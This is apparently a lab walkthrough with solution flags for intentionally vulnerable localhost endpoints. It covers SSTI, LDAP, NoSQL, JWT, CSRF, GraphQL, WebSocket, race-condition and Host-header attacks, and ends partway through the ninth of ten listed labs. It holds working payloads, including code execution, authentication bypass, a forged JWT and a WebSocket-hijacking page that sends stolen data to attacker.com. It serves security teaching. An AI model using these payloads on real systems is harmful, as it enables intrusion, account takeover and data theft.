# Zeroday Academy - Intermediate Labs Walkthrough

**Advanced exploitation techniques with bypass methods for experienced penetration testers**

---

## Table of Contents

1. [Server-Side Template Injection (SSTI)](#1-server-side-template-injection-ssti)
2. [LDAP Injection](#2-ldap-injection)
3. [NoSQL Injection](#3-nosql-injection)
4. [JWT Manipulation](#4-jwt-manipulation)
5. [Advanced CSRF](#5-advanced-csrf)
6. [GraphQL Injection](#6-graphql-injection)
7. [WebSocket Manipulation](#7-websocket-manipulation)
8. [Race Condition](#8-race-condition)
9. [HTTP Host Header Injection](#9-http-host-header-injection)
10. [SSRF via URL Fetcher](#10-ssrf-via-url-fetcher)

---

## 1. Server-Side Template Injection (SSTI)

### Vulnerability Description
Server-Side Template Injection occurs when user input is embedded into template engines without proper sanitization, allowing attackers to execute arbitrary code on the server.

### Lab URL
`http://localhost:5000/api/vuln/ssti`

### Impact
- Remote Code Execution (RCE)
- Server-side file access
- Environment variable exposure
- Complete server compromise

### Solution Steps

#### Step 1: Template Engine Detection
**Objective:** Identify the template engine being used

**Using curl:**
```bash
# Test basic template syntax
curl "http://localhost:5000/api/vuln/ssti?template={{7*7}}"
curl "http://localhost:5000/api/vuln/ssti?template=\${7*7}"
curl "http://localhost:5000/api/vuln/ssti?template=#{7*7}"
```

**Using Burp Suite:**
1. Intercept GET request to `/api/vuln/ssti`
2. Modify `template` parameter with test payloads
3. Look for mathematical evaluation in response (49 indicates vulnerable)

**Expected Response:**
```
Result: 49
```

#### Step 2: Basic Exploitation
**Objective:** Execute code to retrieve environment variables

**Using curl:**
```bash
# Node.js template injection
curl "http://localhost:5000/api/vuln/ssti?template={{constructor.constructor('return process.env')()}}"

# Alternative payload
curl "http://localhost:5000/api/vuln/ssti?template={{global.process.mainModule.require('child_process').execSync('whoami').toString()}}"
```

**Flag:** `{SSTI_CODE_EXECUTION_SUCCESSFUL}`

#### Step 3: WAF Bypass - Alternate Delimiters ⭐
**Bypass Technique:** Use alternate delimiter syntax to bypass WAF filters

**Using curl:**
```bash
# Use {%...%} delimiters instead of {{...}}
curl "http://localhost:5000/api/vuln/ssti?template={%print(7*7)%}"
```

**Using Burp Suite:**
1. Intercept request
2. Try various delimiter combinations: `{%...%}`, `{#...#}`, `<%...%>`
3. WAF may block `{{` but miss `{%`

**Flag:** `{SSTI_WAF_BYPASS_ALTERNATE_DELIMITERS}`

#### Step 4: Filter Evasion - Attribute Chain Bypass ⭐
**Bypass Technique:** Use attribute chaining to access dangerous functions

**Using curl:**
```bash
# Python-style attribute access (if using Jinja2/similar)
curl "http://localhost:5000/api/vuln/ssti?template={{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}"

# Alternative: String concatenation to bypass keyword filters
curl "http://localhost:5000/api/vuln/ssti?template={{constructor.constructor('return pro'+'cess.env')()}}"
```

**Using Burp Suite:**
1. Capture request in Repeater
2. Test attribute chain variations
3. Use string concatenation to bypass keyword blacklists

**Flag:** `{SSTI_FILTER_BYPASS_ATTRIBUTE_CHAIN}`

### Prevention Measures
- Never embed user input directly into templates
- Use template sandboxing (e.g., `vm2` for Node.js)
- Implement strict input validation and sanitization
- Use logic-less template engines where possible
- Apply Content Security Policy (CSP) headers

---

## 2. LDAP Injection

### Vulnerability Description
LDAP Injection exploits applications that construct LDAP queries from user input without proper sanitization, allowing attackers to modify query logic.

### Lab URL
`http://localhost:5000/api/vuln/ldap-injection`

### Impact
- Authentication bypass
- Unauthorized data access
- Information disclosure
- Directory enumeration

### Solution Steps

#### Step 1: Basic Authentication Bypass
**Objective:** Bypass LDAP authentication using injection techniques

**Using curl:**
```bash
# LDAP OR injection
curl "http://localhost:5000/api/vuln/ldap-injection?username=*)(uid=*))(|(uid=*&password=anything"

# Alternative: Comment out password check
curl "http://localhost:5000/api/vuln/ldap-injection?username=admin)(&(password=*))&password=wrong"
```

**Using Burp Suite:**
1. Intercept login request
2. Modify username parameter: `*)(uid=*))(|(uid=*`
3. Common LDAP injection payloads:
   - `*`
   - `*)(uid=*`
   - `admin)(&(password=*))`
   - `admin))(|(uid=*`

**Flag:** `{LDAP_INJECTION_AUTH_BYPASS}`

#### Step 2: Wildcard Filter Bypass ⭐
**Bypass Technique:** Use wildcard character to dump directory entries

**Using curl:**
```bash
# Wildcard to match all users
curl "http://localhost:5000/api/vuln/ldap-injection?username=*"
```

**Using Burp Suite:**
1. Intercept search request
2. Modify username to `*`
3. Response shows all directory entries (LDAP dump)

**Expected Response:**
```json
{
  "users": [
    {"uid": "admin", "cn": "Administrator", "email": "admin@zeroday.lab"},
    {"uid": "user1", "cn": "John Doe", "email": "john@zeroday.lab"},
    ...
  ]
}
```

**Flag:** `{LDAP_INJECTION_WILDCARD_BYPASS}`

#### Step 3: Comment Injection Bypass ⭐
**Bypass Technique:** Use LDAP comments to ignore password validation

**Using curl:**
```bash
# Null byte or comment to terminate query
curl "http://localhost:5000/api/vuln/ldap-injection?username=admin%00&password=anything"
curl "http://localhost:5000/api/vuln/ldap-injection?username=admin)%00&password=anything"
```

**Flag:** `{LDAP_COMMENT_INJECTION_BYPASS}`

#### Step 4: Boolean-Based Blind LDAP ⭐
**Bypass Technique:** Extract data character by character using boolean conditions

**Using curl with automation:**
```bash
#!/bin/bash
# Extract admin password length
for i in {1..50}; do
  response=$(curl -s "http://localhost:5000/api/vuln/ldap-injection?username=admin)(|(password=*))(&(cn=*))(&(objectClass=*")
  if [[ $response == *"success"* ]]; then
    echo "Password length: $i"
    break
  fi
done
```

**Using Burp Suite Intruder:**
1. Send request to Intruder
2. Payload position: `admin)(|(password=§a§*))(&(cn=*`
3. Character brute force: a-z, A-Z, 0-9
4. Analyze response differences

**Flag:** `{LDAP_BOOLEAN_BLIND_INJECTION}`

### Prevention Measures
- Use parameterized LDAP queries
- Implement strict input validation
- Escape special LDAP characters: `*()|\&`
- Use allowlists for acceptable characters
- Implement account lockout mechanisms

---

## 3. NoSQL Injection

### Vulnerability Description
NoSQL Injection exploits NoSQL databases (MongoDB, CouchDB, etc.) that accept JSON/JavaScript operators in queries without proper validation.

### Lab URL
`http://localhost:5000/api/vuln/nosql-injection`

### Impact
- Authentication bypass
- Data extraction
- Privilege escalation
- Database enumeration

### Solution Steps

#### Step 1: Basic Authentication Bypass
**Objective:** Bypass login using NoSQL operators

**Using curl:**
```bash
# $ne (not equal) operator
curl -X POST http://localhost:5000/api/vuln/nosql-injection \
  -H "Content-Type: application/json" \
  -d '{"username":"admin","password":{"$ne":""}}'

# $or operator
curl -X POST http://localhost:5000/api/vuln/nosql-injection \
  -H "Content-Type: application/json" \
  -d '{"username":{"$or":[{"username":"admin"},{"username":""}]},"password":"anything"}'
```

**Using Burp Suite:**
1. Intercept POST request
2. Modify JSON body to use MongoDB operators
3. Common operators: `$ne`, `$gt`, `$regex`, `$where`

**Flag:** `{NOSQL_INJECTION_AUTH_BYPASS}`

#### Step 2: $gt Operator Bypass ⭐
**Bypass Technique:** Use greater-than operator for authentication bypass

**Using curl:**
```bash
# Greater than empty string matches all
curl -X POST http://localhost:5000/api/vuln/nosql-injection \
  -H "Content-Type: application/json" \
  -d '{"username":{"$gt":""},"password":{"$gt":""}}'
```

**Using Burp Suite:**
1. Change JSON to: `{"username":{"$gt":""}}`
2. Server evaluates `username > ""` which is always true
3. Returns first user in database

**Flag:** `{NOSQL_GT_OPERATOR_BYPASS}`

#### Step 3: $regex Operator Bypass ⭐
**Bypass Technique:** Use regex for pattern-based bypass and data extraction

**Using curl:**
```bash
# Regex to match admin user
curl -X POST http://localhost:5000/api/vuln/nosql-injection \
  -H "Content-Type: application/json" \
  -d '{"username":{"$regex":"^a"},"password":{"$ne":""}}'

# Extract password character by character
curl -X POST http://localhost:5000/api/vuln/nosql-injection \
  -H "Content-Type: application/json" \
  -d '{"username":"admin","password":{"$regex":"^p"}}'
```

**Using Burp Suite Intruder:**
1. Set payload: `{"username":"admin","password":{"$regex":"^§a§"}}`
2. Brute force first character: a-z
3. On success, move to second character: `^p§a§`
4. Continue until full password extracted

**Flag:** `{NOSQL_REGEX_INJECTION}`

#### Step 4: $where JavaScript Execution ⭐
**Bypass Technique:** Execute JavaScript via $where clause

**Using curl:**
```bash
# Always true condition
curl -X POST http://localhost:5000/api/vuln/nosql-injection \
  -H "Content-Type: application/json" \
  -d '{"username":{"$where":"1==1"}}'

# Sleep-based blind injection
curl -X POST http://localhost:5000/api/vuln/nosql-injection \
  -H "Content-Type: application/json" \
  -d '{"username":{"$where":"sleep(5000)"}}'
```

**Using Burp Suite:**
1. Inject `$where` clause with JavaScript
2. Test with: `{"$where":"this.username=='admin'"}`
3. Advanced: Extract data using string methods

**Flag:** `{NOSQL_WHERE_CODE_EXECUTION}`

### Prevention Measures
- Never pass user input directly to query operators
- Use object validation libraries (e.g., Joi, Validator.js)
- Disable JavaScript execution in database (`--noscripting`)
- Implement strict type checking
- Use ORMs with built-in sanitization

---

## 4. JWT Manipulation

### Vulnerability Description
JSON Web Token vulnerabilities arise from weak signature verification, algorithm confusion, and improper validation of JWT claims.

### Lab URL
`http://localhost:5000/api/vuln/jwt-manipulation`

### Impact
- Authentication bypass
- Privilege escalation
- Account takeover
- Unauthorized access to resources

### Solution Steps

#### Step 1: JWT Structure Analysis
**Objective:** Understand JWT structure and identify vulnerabilities

**Using jwt.io or command line:**
```bash
# Decode JWT (base64)
echo "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c" | cut -d'.' -f1 | base64 -d
```

**JWT Structure:**
```
Header:  {"alg":"HS256","typ":"JWT"}
Payload: {"sub":"1234567890","name":"John Doe","iat":1516239022}
Signature: HMACSHA256(base64(header) + "." + base64(payload), secret)
```

#### Step 2: Algorithm Confusion Attack
**Objective:** Change RS256 to HS256 to bypass signature verification

**Using curl:**
```bash
# Get JWT from login endpoint
TOKEN=$(curl -s http://localhost:5000/api/vuln/jwt-manipulation/login)

# Decode, change algorithm, re-sign with public key
# (Use jwt_tool or manual scripting)
```

**Manual steps:**
1. Get public key from server
2. Change JWT header: `{"alg":"HS256","typ":"JWT"}`
3. Use public key as HMAC secret to sign
4. Server verifies HS256 signature using public key

**Flag:** `{JWT_ALGORITHM_CONFUSION}`

#### Step 3: "none" Algorithm Bypass ⭐
**Bypass Technique:** Remove signature verification by using "none" algorithm

**Using curl:**
```bash
# Create JWT with "none" algorithm
# Header: {"alg":"none","typ":"JWT"}
# Base64: eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0

# Payload: {"sub":"1234567890","name":"Guest","admin":true}
# Base64: eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6Ikd1ZXN0IiwiYWRtaW4iOnRydWV9

# Final token (note trailing dot, no signature):
TOKEN="eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6Ikd1ZXN0IiwiYWRtaW4iOnRydWV9."

curl -H "Authorization: Bearer $TOKEN" http://localhost:5000/api/vuln/jwt-manipulation/admin
```

**Using Burp Suite:**
1. Intercept request with JWT
2. Decode JWT
3. Change header to `{"alg":"none","typ":"JWT"}`
4. Modify payload: set `"admin":true`
5. Remove signature (keep trailing dot)
6. Base64 encode header and payload
7. Send: `header.payload.`

**Flag:** `{JWT_NONE_ALGORITHM_BYPASS}`

#### Step 4: Weak Secret Brute Force
**Objective:** Crack JWT secret using dictionary attack

**Using jwt_tool:**
```bash
# Download jwt_tool
git clone https://github.com/ticarpi/jwt_tool
cd jwt_tool

# Crack secret
python3 jwt_tool.py <JWT_TOKEN> -C -d /usr/share/wordlists/rockyou.txt
```

**Using hashcat:**
```bash
# Save JWT to file
echo "JWT_TOKEN" > jwt.txt

# Crack with hashcat
hashcat -a 0 -m 16500 jwt.txt /usr/share/wordlists/rockyou.txt
```

**Flag:** `{JWT_WEAK_SECRET_CRACKED}`

### Prevention Measures
- Always verify JWT algorithm matches expected type
- Reject "none" algorithm explicitly
- Use strong, random secrets (256+ bits)
- Implement token expiration (exp claim)
- Use asymmetric algorithms (RS256) for distributed systems
- Validate all claims (iss, aud, exp, nbf)

---

## 5. Advanced CSRF

### Vulnerability Description
Cross-Site Request Forgery attacks that bypass modern protections like CSRF tokens, SameSite cookies, and referrer checks.

### Lab URL
`http://localhost:5000/api/vuln/csrf-advanced`

### Impact
- Unauthorized actions on behalf of authenticated users
- Account takeover
- Financial fraud
- Data modification

### Solution Steps

#### Step 1: Identify CSRF Protection Mechanisms
**Objective:** Analyze the application's CSRF defenses

**Using curl:**
```bash
# Check for CSRF tokens
curl -i http://localhost:5000/api/vuln/csrf-advanced

# Analyze cookies
curl -i http://localhost:5000/api/vuln/csrf-advanced | grep -i "set-cookie"
```

**Using Burp Suite:**
1. Intercept form submission
2. Look for CSRF tokens in forms/headers
3. Check cookie attributes: `SameSite`, `Secure`, `HttpOnly`
4. Note: `SameSite=None` allows cross-site cookie sending

#### Step 2: Basic CSRF Attack
**Objective:** Perform state-changing action from malicious site

**Create evil.html:**
```html
<!DOCTYPE html>
<html>
<body>
  <h1>Click here to win a prize!</h1>
  <form id="csrf" action="http://localhost:5000/api/vuln/csrf-advanced/transfer" method="POST">
    <input type="hidden" name="recipient" value="attacker@evil.com">
    <input type="hidden" name="amount" value="1000">
  </form>
  <script>
    document.getElementById('csrf').submit();
  </script>
</body>
</html>
```

**Host the page:**
```bash
# Start simple HTTP server
python3 -m http.server 8000

# Victim visits: http://localhost:8000/evil.html
```

#### Step 3: SameSite=None Cookie Bypass ⭐
**Bypass Technique:** Exploit SameSite=None cookies in cross-site requests

**Analysis:**
```bash
# Check cookie configuration
curl -i http://localhost:5000/api/vuln/csrf-advanced | grep "Set-Cookie"
# Output: Set-Cookie: csrf_session=user_123; SameSite=None; Secure
```

**Exploitation - Create advanced evil.html:**
```html
<!DOCTYPE html>
<html>
<head>
  <title>Free Gift Card</title>
</head>
<body>
  <h1>Loading your gift card...</h1>
  
  <!-- CSRF Attack Form -->
  <form id="csrf" action="http://localhost:5000/api/vuln/csrf-advanced/transfer" method="POST">
    <input type="hidden" name="recipient" value="attacker@evil.com">
    <input type="hidden" name="amount" value="10000">
    <input type="hidden" name="csrf_token" id="token">
  </form>
  
  <script>
    // Generate predictable CSRF token (timestamp-based)
    const timestamp = Math.floor(Date.now() / 1000);
    document.getElementById('token').value = 'csrf_' + timestamp;
    
    // Auto-submit
    document.getElementById('csrf').submit();
  </script>
</body>
</html>
```

**Using Burp Suite:**
1. Intercept the legitimate transfer request
2. Note the CSRF token generation pattern
3. Create attack page that predicts/generates valid token
4. Host on HTTPS (required for SameSite=None)
5. Victim's browser sends cookies due to `SameSite=None`

**Flag:** `{CSRF_SAMESITE_BYPASS_SUCCESSFUL}`

#### Step 4: GET-Based CSRF
**Objective:** Exploit state-changing GET requests

**Using curl:**
```bash
# Test if GET request works for state changes
curl "http://localhost:5000/api/vuln/csrf-advanced/change-email?email=attacker@evil.com"
```

**Create image-based attack:**
```html
<!-- Embed in attacker's website -->
<img src="http://localhost:5000/api/vuln/csrf-advanced/change-email?email=attacker@evil.com" style="display:none">
```

**Flag:** `{CSRF_GET_METHOD_EXPLOIT}`

### Prevention Measures
- Use `SameSite=Strict` or `SameSite=Lax` for cookies
- Implement cryptographically random CSRF tokens
- Validate Origin and Referer headers
- Use custom request headers for AJAX requests
- Require re-authentication for sensitive actions
- Implement CAPTCHA for critical operations

---

## 6. GraphQL Injection

### Vulnerability Description
GraphQL vulnerabilities arise from insufficient query validation, enabled introspection, lack of depth limiting, and query batching without rate limits.

### Lab URL
`http://localhost:5000/api/vuln/graphql-injection`

### Impact
- Schema disclosure
- Data over-fetching
- Denial of Service (DoS)
- Authorization bypass

### Solution Steps

#### Step 1: Schema Introspection
**Objective:** Extract full GraphQL schema

**Using curl:**
```bash
# Basic introspection query
curl -X POST http://localhost:5000/api/vuln/graphql-injection \
  -H "Content-Type: application/json" \
  -d '{
    "query": "{ __schema { types { name fields { name type { name } } } } }"
  }'

# Full introspection query
curl -X POST http://localhost:5000/api/vuln/graphql-injection \
  -H "Content-Type: application/json" \
  -d '{
    "query": "query IntrospectionQuery { __schema { queryType { name } mutationType { name } types { name kind fields { name type { name kind ofType { name kind } } } } } }"
  }'
```

**Using Burp Suite:**
1. Send POST to `/api/vuln/graphql-injection`
2. Use GraphQL introspection query
3. Parse response to map entire schema

**Flag:** `{GRAPHQL_SCHEMA_EXPOSED}`

#### Step 2: Introspection Bypass ⭐
**Bypass Technique:** Query schema when introspection appears "disabled"

**Using curl:**
```bash
# Simplified introspection that might bypass filters
curl -X POST http://localhost:5000/api/vuln/graphql-injection \
  -H "Content-Type: application/json" \
  -d '{"query":"{__schema{types{name}}}"}'

# Alternative: Use fragments
curl -X POST http://localhost:5000/api/vuln/graphql-injection \
  -H "Content-Type: application/json" \
  -d '{
    "query": "fragment Schema on __Schema { types { name } } query { __schema { ...Schema } }"
  }'
```

**Using Burp Suite:**
1. Try minified introspection: `{__schema{types{name}}}`
2. Use aliases: `{s:__schema{t:types{n:name}}}`
3. WAF might block `__schema` but miss compact versions

**Flag:** `{GRAPHQL_INTROSPECTION_BYPASS}`

#### Step 3: Query Batching Bypass ⭐
**Bypass Technique:** Extract multiple resources in single request to bypass rate limits

**Using curl:**
```bash
# Batch query to extract multiple endpoints
curl -X POST http://localhost:5000/api/vuln/graphql-injection \
  -H "Content-Type: application/json" \
  -d '[
    {"query":"{users{id,username,email}}"},
    {"query":"{posts{id,title,content}}"},
    {"query":"{comments{id,text,author}}"} 
  ]'

# Alternative: Aliased batching
curl -X POST http://localhost:5000/api/vuln/graphql-injection \
  -H "Content-Type: application/json" \
  -d '{
    "query": "{
      u1: users { id username }
      u2: posts { id title }
      u3: comments { id text }
    }"
  }'
```

**Using Burp Suite Intruder:**
1. Create batch query array
2. Enumerate all resources simultaneously
3. Bypass per-query rate limits

**Flag:** `{GRAPHQL_BATCH_QUERY_BYPASS}`

#### Step 4: Depth Limit Bypass ⭐
**Bypass Technique:** Deeply nested queries to access sensitive data

**Using curl:**
```bash
# Circular query to cause DoS or access nested data
curl -X POST http://localhost:5000/api/vuln/graphql-injection \
  -H "Content-Type: application/json" \
  -d '{
    "query": "{
      users {
        id
        posts {
          id
          comments {
            id
            author {
              id
              posts {
                id
                comments {
                  id
                }
              }
            }
          }
        }
      }
    }"
  }'
```

**Using Burp Suite:**
1. Create deeply nested query (10+ levels)
2. Target circular relationships: user→posts→comments→user
3. Can cause DoS or extract hidden data

**Flag:** `{GRAPHQL_DEPTH_LIMIT_BYPASS}`

#### Step 5: __typename Disclosure ⭐
**Bypass Technique:** Use __typename to discover field types

**Using curl:**
```bash
# Discover type information
curl -X POST http://localhost:5000/api/vuln/graphql-injection \
  -H "Content-Type: application/json" \
  -d '{
    "query": "{ users { id username email __typename } }"
  }'

# Discover hidden fields via typename
curl -X POST http://localhost:5000/api/vuln/graphql-injection \
  -H "Content-Type: application/json" \
  -d '{
    "query": "{ __type(name: \"User\") { fields { name type { name } } } }"
  }'
```

**Expected Response:**
```json
{
  "data": {
    "users": [
      {
        "id": "1",
        "username": "admin",
        "email": "admin@zeroday.lab",
        "__typename": "User"
      }
    ]
  }
}
```

**Flag:** `{GRAPHQL_TYPENAME_DISCLOSURE}`

### Prevention Measures
- Disable introspection in production
- Implement query depth limiting (max 5-7 levels)
- Use query complexity analysis
- Implement rate limiting per user/IP
- Disable query batching or limit batch size
- Use persisted queries (query allowlisting)
- Implement field-level authorization

---

## 7. WebSocket Manipulation

### Vulnerability Description
WebSocket vulnerabilities arise from insufficient origin validation, lack of authentication, and improper message validation.

### Lab URL
`http://localhost:5000/api/vuln/websocket-manipulation`

### Impact
- Unauthorized real-time communication
- Message injection/manipulation
- Cross-site WebSocket hijacking (CSWSH)
- Information disclosure

### Solution Steps

#### Step 1: WebSocket Connection Analysis
**Objective:** Understand WebSocket handshake and message flow

**Using Burp Suite:**
1. Open WebSocket lab in browser
2. Enable Burp WebSocket interception
3. Proxy → WebSockets history
4. Observe handshake:
   ```
   GET /api/vuln/websocket-manipulation HTTP/1.1
   Upgrade: websocket
   Connection: Upgrade
   Origin: http://localhost:5000
   Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==
   ```

#### Step 2: Message Interception and Manipulation
**Objective:** Intercept and modify WebSocket messages

**Using Burp Suite:**
1. WebSocket history → Find active connection
2. Right-click → "Send to Repeater"
3. Modify messages in real-time:
   ```json
   {"type":"chat","user":"victim","message":"Hello"}
   ```
4. Change to:
   ```json
   {"type":"chat","user":"admin","message":"<script>alert(1)</script>"}
   ```
5. Send modified message

**Flag:** `{WEBSOCKET_MESSAGE_MANIPULATION}`

#### Step 3: Origin Validation Bypass ⭐
**Bypass Technique:** Bypass weak origin validation with substring matching

**Analysis:**
```javascript
// Vulnerable server code checks:
if (origin.includes('trusted')) {
  // Allow connection
}
```

**Using Burp Suite:**
1. Intercept WebSocket upgrade request
2. Modify `Origin` header to:
   - `http://evil.trusted.com` (contains "trusted")
   - `http://trusted-attacker.com` (contains "trusted")
   - `http://attacker.com/trusted.html` (contains "trusted")

**Using custom WebSocket client:**
```html
<!-- evil-websocket.html -->
<!DOCTYPE html>
<html>
<body>
  <h1>WebSocket CSWSH Attack</h1>
  <script>
    // Custom origin will be sent by browser
    const ws = new WebSocket('ws://localhost:5000/api/vuln/websocket-manipulation');
    
    ws.onopen = () => {
      console.log('Connected with malicious origin!');
      ws.send(JSON.stringify({
        type: 'admin_command',
        command: 'deleteAllUsers'
      }));
    };
    
    ws.onmessage = (event) => {
      console.log('Received:', event.data);
      document.body.innerHTML += '<p>Data: ' + event.data + '</p>';
    };
  </script>
</body>
</html>
```

**Burp Suite Steps:**
1. Intercept WebSocket upgrade
2. Change Origin: `http://evil.trusted.com`
3. Server accepts due to substring match
4. Successful connection from malicious origin

**Flag:** `{WEBSOCKET_ORIGIN_VALIDATION_BYPASS}`

#### Step 4: Cross-Site WebSocket Hijacking (CSWSH)
**Objective:** Hijack WebSocket from attacker's website

**Create attack page (cswsh.html):**
```html
<!DOCTYPE html>
<html>
<head>
  <title>Legitimate Site</title>
</head>
<body>
  <h1>Welcome to our site!</h1>
  <div id="stolen-data"></div>
  
  <script>
    // Connect to victim's WebSocket
    const ws = new WebSocket('ws://localhost:5000/api/vuln/websocket-manipulation');
    
    ws.onmessage = (event) => {
      // Steal sensitive data
      const data = JSON.parse(event.data);
      document.getElementById('stolen-data').innerHTML += '<p>' + JSON.stringify(data) + '</p>';
      
      // Exfiltrate to attacker server
      fetch('https://attacker.com/collect', {
        method: 'POST',
        body: JSON.stringify(data)
      });
    };
    
    ws.onopen = () => {
      // Send malicious commands
      ws.send(JSON.stringify({type: 'getAdminData'}));
    };
  </script>
</body>
</html>
```

**Flag:** `{CSWSH_SUCCESSFUL}`

### Prevention Measures
- Validate Origin header against strict allowlist
- Require authentication tokens in WebSocket handshake
- Implement message signing/encryption
- Use WSS (WebSocket Secure) over TLS
- Implement rate limiting per connection
- Validate message structure and content
- Use CSRF tokens in WebSocket upgrade requests

---

## 8. Race Condition

### Vulnerability Description
Race condition vulnerabilities occur when multiple requests exploit timing windows in validation and execution, allowing attackers to bypass business logic.

### Lab URL
`http://localhost:5000/api/vuln/race-condition`

### Impact
- Financial fraud (multiple discount applications)
- Inventory manipulation
- Privilege escalation
- Resource exhaustion

### Solution Steps

#### Step 1: Identify Race Condition Window
**Objective:** Find time gap between validation and execution

**Using curl:**
```bash
# Test normal request
curl http://localhost:5000/api/vuln/race-condition
# Response: {"balance": 100, "discount_available": true}

# Apply discount once
curl -X POST http://localhost:5000/api/vuln/race-condition/purchase \
  -H "Content-Type: application/json" \
  -d '{"use_discount": true}'
# Response: {"balance": 150, "discount_used": true}
```

**Vulnerability:** 
- Check: `if (discount_available) { ... }`
- Use: `balance += 50; discount_available = false;`
- Time gap between check and use = TOCTOU vulnerability

#### Step 2: TOCTOU Bypass with Burp Repeater ⭐
**Bypass Technique:** Time-of-Check-Time-of-Use exploitation using parallel requests

**Using Burp Suite Repeater:**
1. Send discount request to Repeater
2. Right-click → "Create tab group" → Add 20 copies
3. Select all tabs → Right-click → "Send group in parallel"
4. All requests hit server simultaneously
5. Multiple requests pass validation before any updates state

**Expected Result:**
```bash
# Check balance after attack
curl http://localhost:5000/api/vuln/race-condition
# Response: {"balance": 1100}  # 100 + (50 * 20) = 1100
```

**Flag:** `{RACE_CONDITION_EXPLOITED_MULTIPLE_USES}`

#### Step 3: TOCTOU Bypass with Burp Intruder ⭐
**Bypass Technique:** Automated concurrent request flooding

**Using Burp Suite Intruder:**
1. Send purchase request to Intruder
2. Set payload position (not needed, use null payloads)
3. **Payloads tab:**
   - Payload type: "Null payloads"
   - Generate: 50 payloads
4. **Resource Pool tab:**
   - Create new pool: "Race Condition"
   - Maximum concurrent requests: 50
5. **Start attack**

**Automation script (race_condition.py):**
```python
import requests
import threading

url = "http://localhost:5000/api/vuln/race-condition/purchase"
headers = {"Content-Type": "application/json"}
data = {"use_discount": True}

def exploit():
    response = requests.post(url, json=data, headers=headers)
    print(f"Response: {response.json()}")

# Launch 50 concurrent requests
threads = []
for i in range(50):
    t = threading.Thread(target=exploit)
    threads.append(t)
    t.start()

# Wait for all threads
for t in threads:
    t.join()

# Check final balance
balance = requests.get("http://localhost:5000/api/vuln/race-condition").json()
print(f"Final balance: {balance}")
```

**Run the script:**
```bash
python3 race_condition.py
```

**Expected Output:**
```
Response: {'balance': 150, 'discount_used': True}
Response: {'balance': 200, 'discount_used': True}
Response: {'balance': 250, 'discount_used': True}
...
Final balance: {'balance': 2600}
```

#### Step 4: Database-Level Race Condition
**Objective:** Exploit transaction isolation issues

**Using curl with GNU Parallel:**
```bash
# Install GNU Parallel
sudo apt-get install parallel

# Create request file
cat > requests.txt << EOF
curl -X POST http://localhost:5000/api/vuln/race-condition/purchase -H "Content-Type: application/json" -d '{"use_discount":true}'
EOF

# Execute 100 concurrent requests
cat requests.txt | parallel -j 100
```

**Flag:** `{RACE_CONDITION_DATABASE_EXPLOIT}`

### Prevention Measures
- Use database transactions with proper isolation levels
- Implement pessimistic locking (SELECT FOR UPDATE)
- Use atomic operations (ACID compliance)
- Implement idempotency keys for critical operations
- Use distributed locks (Redis, Memcached) for multi-server setups
- Implement request deduplication
- Use message queues for sequential processing

---

## 9. HTTP Host Header Injection

### Vulnerability Description
Host header injection exploits applications that use the Host header to generate URLs without validation, enabling cache poisoning and password reset poisoning.

### Lab URL
`http://localhost:5000/api/vuln/host-header-injection`

### Impact
- Password reset poisoning
- Cache poisoning
- Web cache deception
- SSRF (Server-Side Request Forgery)

### Solution Steps

#### Step 1: Identify Host Header Usage
**Objective:** Determine how application uses Host header

**Using curl:**
```bash
# Normal request
curl -H "Host: localhost:5000" http://localhost:5000/api/vuln/host-header-injection

# Test modified Host header
curl -H "Host: evil.com" http://localhost:5000/api/vuln/host-header-injection
```

**Using Burp Suite:**
1. Intercept GET request
2. Observe where Host header is reflected:
   ```
   GET /api/vuln/host-header-injection HTTP/1.1
   Host: localhost:5000
   
   Response:
   {
     "reset_link": "http://localhost:5000/reset?token=abc123"
   }
   ```

#### Step 2: Basic Host Header Injection
**Objective:** Inject malicious domain in Host header

**Using curl:**
```bash
# Inject attacker's domain
curl -X POST http://localhost:5000/api/vuln/host-header-injection/reset \
  -H "Host: evil.com" \
  -H "Content-Type: application/json" \
  -d '{"email":"victim@example.com"}'
```

**Expected Response:**
```json
{
  "message": "Password reset email sent",
  "reset_link": "http://evil.com/reset?token=secret_token_123"
}
```

**Attack flow:**
1. Attacker triggers password reset for victim
2. Injects `Host: attacker.com`
3. Victim receives email with reset link to attacker's domain
4. Victim clicks link, token sent to attacker
5. Attacker uses token to reset victim's password

**Flag:** `{HOST_HEADER_INJECTION_SUCCESSFUL}`

#### Step 3: X-Forwarded-Host Bypass ⭐
**Bypass Technique:** Use X-Forwarded-Host for password reset poisoning

**Using curl:**
```bash
# Try X-Forwarded-Host header
curl -X POST http://localhost:5000/api/vuln/host-header-injection/reset \
  -H "Host: localhost:5000" \
  -H "X-Forwarded-Host: evil.com" \
  -H "Content-Type: application/json" \
  -d '{"email":"victim@example.com"}'
```

**Using Burp Suite:**
1. Intercept password reset POST
2. Add header: `X-Forwarded-Host: evil.com`
3. Server prioritizes X-Forwarded-Host over Host
4. Reset link generated with attacker's domain

**Expected Response:**
```json
{
  "message": "Password reset email sent",
  "reset_link": "http://evil.com/reset?token=captured_token_456",
  "flag": "{HOST_HEADER_X_FORWARDED_HOST_BYPASS}"
}
```

**Flag:** `{HOST_HEADER_X_FORWARDED_HOST_BYPASS}`

#### Step 4: X-Original-Host Bypass ⭐
**Bypass Technique:** Use alternative X-Original-Host header

**Using curl:**
```bash
# Try X-Original-Host
curl -X POST http://localhost:5000/api/vuln/host-header-injection/reset \
  -H "Host: localhost:5000" \
  -H "X-Original-Host: attacker.com" \
  -H "Content-Type: application/json" \
  -d '{"email":"victim@example.com"}'

# Try other header variations
curl -X POST http://localhost:5000/api/vuln/host-header-injection/reset \
  -H "X-Host: attacker.com" \
  -d '{"email":"victim@example.com"}'

curl -X POST http://localhost:5000/api/vuln/host-header-injection/reset \
  -H "X-Forwarded-Server: attacker.com" \
  -d '{"email":"victim@example.com"}'
```

**Using Burp Suite Intruder:**
1. Send to Intruder
2. Payload position: `§X-Forwarded-Host§: evil.com`
3. Payload list:
   ```
   X-Forwarded-Host
   X-Original-Host
   X-Host
   X-Forwarded-Server
   Forwarded
   ```
4. Identify which headers are accepted

